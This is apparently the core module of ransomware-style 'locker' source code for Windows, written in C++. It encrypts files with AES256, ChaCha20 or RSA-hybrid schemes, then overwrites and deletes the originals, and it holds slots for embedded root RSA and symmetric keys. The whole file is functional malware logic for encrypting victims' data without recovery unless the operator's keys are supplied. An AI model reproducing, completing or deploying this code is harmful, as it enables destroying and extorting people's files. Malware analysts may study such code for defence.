#include "locker.h"
#include "filesystem.h"
#include "global_parameters.h"
#include "memory.h"
#include "logs.h"

#include <stdio.h>
#include <cstdint>
#include <string>


STATIC VOID PrintHex(CONST BYTE* data, DWORD size)
{
	for (size_t i = 0; i < size; ++i)
		printf_s("\\x%02X", data[i]);
	printf_s("\n");
}

VOID aes_block_fn(PFILE_INFO FileInfo, crypto_aes_ctx* ctx, u32* padding, BYTE* in, BYTE* out, u32 bytes)
{	
	aes_encrypt_blocks(ctx, in, out, bytes, padding, FileInfo->CryptInfo->mode);
}


VOID chacha_block_fn(PFILE_INFO FileInfo, laced_ctx* ctx, u32* padding, BYTE* in, BYTE* out, u32 bytes)
{	
	ECRYPT_encrypt_bytes(ctx, in, out, bytes);
}

STATIC VOID HandlerGenKeyChaCha(laced_ctx* CryptCtx, CONST BYTE* ChaChaKey, CONST BYTE* ChaChaIV)
{		
	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));
	ECRYPT_keysetup(CryptCtx, ChaChaKey, 256, 64);
	ECRYPT_ivsetup(CryptCtx, ChaChaIV);
}

STATIC VOID HandlerGenKeyAES(crypto_aes_ctx* CryptCtx, CONST BYTE* AESKey)
{		
	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));	
	aes_expandkey(CryptCtx, AESKey);
}

STATIC BOOL SymmetricMethodState(PFILE_INFO FileInfo)
{
	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
		FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, global::GetKey(), global::GetIV());
	EncryptModes mode = global::GetEncMode();
	if (!filesystem::OptionEncryptMode(FileInfo, mode))
		return FALSE;
	return TRUE;
}

STATIC BOOL HybridMethodStateCrypt(PFILE_INFO FileInfo)
{
	if (!filesystem::FileCryptEncrypt(FileInfo))
	{
		LOG_ERROR(L"[CryptEncrypt] Failed; %ls", FileInfo->Filename);
		return FALSE;
	}

	return TRUE;
}

STATIC BOOL HybridMethodStateDecrypt(PFILE_INFO FileInfo)
{	
	if (!filesystem::FileCryptDecrypt(FileInfo))
	{
		LOG_ERROR(L"[CryptDecrypt] Failed; %ls", FileInfo->Filename);
		return FALSE;
	}

	return TRUE;
}


STATIC BOOL RSAOnlyMethodState(PFILE_INFO FileInfo)
{
	if (!filesystem::EncryptRSA(FileInfo))
	{
		LOG_ERROR(L"[EncryptRSA] Failed Encrypt/Decrypt ONLY RSA; %ls", FileInfo->Filename);
		return FALSE;
	}

	return TRUE;
}

VOID locker::CryptoSystemInit(CRYPTO_SYSTEM* sys)
{	
	sys->alg[0] =
	{	
		.name = "AES256",		
		.mode = 0,
		.method_policy = AES256,
		.gen_policy = GENKEY_ONCE,
		.crypt_method = (EncryptMethodFunc)aes_block_fn,
		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES
	};

	sys->alg[1] =
	{		
		.name = "ChaCha20",		
		.mode = 0,
		.method_policy = CHACHA,
		.gen_policy = GENKEY_EVERY_ONCE,		
		.crypt_method = (EncryptMethodFunc)chacha_block_fn,
		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha
	};

	sys->alg[2] =
	{		
		.name = "RSA_AES256",
		.mode = 0,
		.method_policy = RSA_AES256,
		.gen_policy = GENKEY_EVERY_ONCE,
		.crypt_method = (EncryptMethodFunc)aes_block_fn,
		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES
	};

	sys->alg[3] =
	{		
		.name = "RSA_CHACHA",		
		.mode = 0,
		.method_policy = RSA_CHACHA,
		.gen_policy = GENKEY_EVERY_ONCE,		
		.crypt_method = (EncryptMethodFunc)chacha_block_fn,
		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha
	};

	sys->alg[4] =
	{
		.name = "RSA",		
		.mode = 0,
		.method_policy = RSA,
		.gen_policy = NONE,
		.crypt_method = NULL,
		.gen_key_method = NULL
	};
	
	sys->num = 5;
}

BOOL CryptSystemGetMethod(CRYPTO_SYSTEM* sys, CryptoPolicy name, CRYPT_INFO* copyCI)
{
	for (u32 i = 0; i < sys->num; ++i)
	{
		if (sys->alg[i].method_policy == name)
		{	
			*copyCI = sys->alg[i];
			return TRUE;
		}
	}
	return FALSE;
}

VOID locker::FreeCryptInfo(CRYPT_INFO* CryptInfo)
{
	if (!CryptInfo)
		return;

	if (CryptInfo->ctx)
	{
		memory::memzero_explicit(CryptInfo->ctx, sizeof(CryptInfo->ctx));
		memory::m_free(CryptInfo->ctx);
		CryptInfo->ctx = NULL;
	}
	
	if (CryptInfo->desc.key_data)
	{
		memory::memzero_explicit(CryptInfo->desc.key_data, 4096);
		memory::m_free(CryptInfo->desc.key_data);
		CryptInfo->desc.key_data = NULL;
	}

	if (CryptInfo->desc.handle_rsa_key) 
	{
		BCryptDestroyKey(CryptInfo->desc.handle_rsa_key);
		CryptInfo->desc.handle_rsa_key = NULL;
	}

	if (CryptInfo->desc.crypto_provider) 
	{
		BCryptCloseAlgorithmProvider(CryptInfo->desc.crypto_provider, 0);
		CryptInfo->desc.crypto_provider = NULL;
	}
	
	delete CryptInfo;
}


BOOL locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
{
	CRYPTO_SYSTEM sys;
	CryptoSystemInit(&sys);
	
	if (!CryptSystemGetMethod(&sys, global::GetEncryptMethod(), CryptInfo))
		return FALSE;

	EncryptCipher state_crypt = global::GetDeCrypt();
	EncryptModes state_mode = global::GetEncMode();
		
	if (CryptInfo->method_policy == AES256 || CryptInfo->method_policy == RSA_AES256)
	{
		if (state_crypt == EncryptCipher::CRYPT)
		{
			if (state_mode == EncryptModes::FULL_ENCRYPT)
				CryptInfo->mode = MODE_AES::AES_CRYPT;
			else
				CryptInfo->mode = MODE_AES::AES_CRYPT_NO_PADDING;
		}
		else if (state_crypt == EncryptCipher::DECRYPT)
		{
			if (state_mode == EncryptModes::FULL_ENCRYPT)
				CryptInfo->mode = MODE_AES::AES_DECRYPT;
			else
				CryptInfo->mode = MODE_AES::AES_DECRYPT_NO_PADDING;
		}
	}
	if (CryptInfo->gen_policy == GENKEY_ONCE)
	{
		if(CryptInfo->method_policy == AES256)
			CryptInfo->ctx = (crypto_aes_ctx*)memory::m_malloc(sizeof(crypto_aes_ctx));
		else
		{
			LOG_ERROR(L"[METHOD_POLICY] Failed; missing method");
			return FALSE;
		}
		CryptInfo->gen_key_method(CryptInfo->ctx, global::GetKey(), global::GetIV());
	}

	if (CryptInfo->method_policy == RSA_CHACHA || CryptInfo->method_policy == RSA_AES256 || CryptInfo->method_policy == RSA)
	{		
		CryptInfo->desc.key_data = (BYTE*)memory::m_malloc(4096);
		CryptInfo->desc.crypto_provider = NULL;
		CryptInfo->desc.handle_rsa_key = NULL;
		CryptInfo->desc.rsa_path = global::GetPathRSAKey();
		if (!filesystem::ReadRSAFile(CryptInfo))
		{
			LOG_ERROR(L"[ReadRSAFile] Failed; %ls", CryptInfo->desc.rsa_path);
			FreeCryptInfo(CryptInfo);
			return FALSE;
		}
		if (CryptInfo->desc.crypto_provider == NULL || CryptInfo->desc.handle_rsa_key == NULL)
		{
			LOG_ERROR(L"[DESCRIPTOR - PROVIDER] Failed; %ls", CryptInfo->desc.rsa_path);
			FreeCryptInfo(CryptInfo);
			return FALSE;
		}
	}

	if (CryptInfo->method_policy == AES256 || CryptInfo->method_policy == CHACHA)
	{
		CryptInfo->algo_method = (EncryptAlgoMethod)SymmetricMethodState;
	}
	else if (CryptInfo->method_policy == RSA_AES256 || CryptInfo->method_policy == RSA_CHACHA)
	{
		if (state_crypt == EncryptCipher::CRYPT)
			CryptInfo->algo_method = (EncryptAlgoMethod)HybridMethodStateCrypt;
		else if (state_crypt == EncryptCipher::DECRYPT)		
			CryptInfo->algo_method = (EncryptAlgoMethod)HybridMethodStateDecrypt;		
		else
		{
			LOG_ERROR(L"[GeneratePolicy] Failed; missing crypt/decrypt");
			return FALSE;
		}
	}
	else if (CryptInfo->method_policy == RSA)
	{
		CryptInfo->algo_method = (EncryptAlgoMethod)RSAOnlyMethodState;
	}
	else
	{
		LOG_ERROR(L"[GeneratePolicy] Failed; missing algorithm method");
		return FALSE;
	}
	
	return TRUE;
}


STATIC BOOL SecureDelete(CONST WCHAR* FilePath)
{	
	HANDLE Handle = CreateFileW(FilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (Handle == INVALID_HANDLE_VALUE)
		return FALSE;	

	if(SetFilePointer(Handle, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER
		|| !SetEndOfFile(Handle))
		return FALSE;
	CloseHandle(Handle);
	return DeleteFileW(FilePath);
}


STATIC BOOL SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo)
{
	FileInfo->Filename = data->Filename;
	FileInfo->newFilename = filesystem::MakeCopyFile(data->Path, data->Filename, data->Exst, data->FullPath);
	FileInfo->CryptInfo = CryptInfo;
	FileInfo->FilePath = data->FullPath;
	FileInfo->padding = 0;

	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
	{
		if (FileInfo->CryptInfo->method_policy == CHACHA || FileInfo->CryptInfo->method_policy == RSA_CHACHA)
			FileInfo->ctx = (laced_ctx*)memory::m_malloc(sizeof(laced_ctx));
		else
			FileInfo->ctx = (crypto_aes_ctx*)memory::m_malloc(sizeof(crypto_aes_ctx));
	}
	else if(CryptInfo->gen_policy == GENKEY_ONCE)
		FileInfo->ctx = FileInfo->CryptInfo->ctx;

	if (!filesystem::getParseFile(FileInfo) || FileInfo->FileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"[SetOptionFileInfo] [ParseFile] Failed; %ls; GetLastError = %lu", data->Filename, GetLastError());
		return FALSE;
	}
	if (!filesystem::CreateFileOpen(FileInfo, CREATE_NEW) || FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"[SetOptionFileInfo] [CreateFileOpen] Failed; %ls; GetLastError = %lu", data->Filename, GetLastError());
		return FALSE;
	}
	
	return TRUE;
}

BOOL locker::HandlerCrypt
(
	CRYPT_INFO* CryptInfo,
	PDRIVE_INFO data,
	SLIST<HLIST>* HashList
)
{		
	BOOL success = FALSE;
	FILE_INFO FileInfo;		
	if (!SetOptionFileInfo(&FileInfo, data, CryptInfo))
		goto END;
	
	if (!FileInfo.CryptInfo->algo_method(&FileInfo))
		goto END;

	if (HashList)
	{
		if (global::GetDeCrypt() == EncryptCipher::CRYPT)
		{
			if (!filesystem::HashSignatureFile(HashList, FileInfo.FileHandle))
				LOG_ERROR(L"[HashSignatureFile] Failed; %ls", FileInfo.Filename);
		}			
		else if (global::GetDeCrypt() == EncryptCipher::DECRYPT)
		{
			if (!filesystem::HashSignatureFile(HashList, FileInfo.newFileHandle))
				LOG_ERROR(L"[HashSignatureFile] Failed; %ls", FileInfo.newFilename);
		}			
	}

	if (global::GetStatusOverWrite())
	{
		if (!filesystem::OverWriteFile(&FileInfo))
			LOG_ERROR(L"[OverWriteFile] Failed; %ls", data->Filename);
	}

	LOG_SUCCESS(L"success encrypt file; %ls", data->Filename);
	
	success = TRUE;
END:
	
	if (FileInfo.FileHandle && FileInfo.FileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileInfo.FileHandle);
	if (FileInfo.newFileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileInfo.newFileHandle);

	if (!success)
		SecureDelete(FileInfo.newFilename);
	else if (global::GetFlagDelete())
		if (!SecureDelete(FileInfo.FilePath))
			LOG_ERROR(L"[SecureDelete] Failed; %ls; GetLastError = %lu", data->Filename, GetLastError());
	memory::m_free(FileInfo.newFilename);
	if (FileInfo.CryptInfo->gen_policy == GENKEY_EVERY_ONCE && FileInfo.ctx) memory::m_free(FileInfo.ctx);
	memory::memzero_explicit(&FileInfo, sizeof(FileInfo));	
	return TRUE;
}

VOID locker::LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size)
{
	BYTE pub[] = "__public_key__"; // "\x06\x02\x00" Root RSA Public key / Type -print while gen keys
	*size = sizeof(pub);
	*g_PublicKeyRoot = (BYTE*)memory::m_malloc(4096);
	if (!g_PublicKeyRoot) return;
	memcpy(*g_PublicKeyRoot, pub, *size);
	memory::memzero_explicit((VOID*)pub, *size);
}

VOID locker::LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size)
{
	BYTE prv[] = "__private_key__"; // "\x07\x02\x00" Root RSA Private key / Type -print while gen keys
	*size = sizeof(prv);
	*g_PrivateKeyRoot = (BYTE*)memory::m_malloc(4096);
	if (!g_PrivateKeyRoot) return;
	memcpy(*g_PrivateKeyRoot, prv, *size);
	memory::memzero_explicit((VOID*)prv, *size);
}

VOID locker::LoadRootSymmetricKey(BYTE** g_RootKey, BYTE** g_RootIV)
{
	BYTE root_key[] = "____________ROOT_KEY____________";
	BYTE root_iv[] = "ROOT__IV";
	*g_RootKey = (BYTE*)memory::m_malloc(32);
	*g_RootIV = (BYTE*)memory::m_malloc(8);
	if (!g_RootKey || !g_RootIV)
		return;
	memcpy(g_RootKey, root_key, 32);
	memcpy(g_RootIV, root_iv, 8);
	memory::memzero_explicit((VOID*)root_key, sizeof(root_key));
	memory::memzero_explicit((VOID*)root_iv, sizeof(root_iv));
}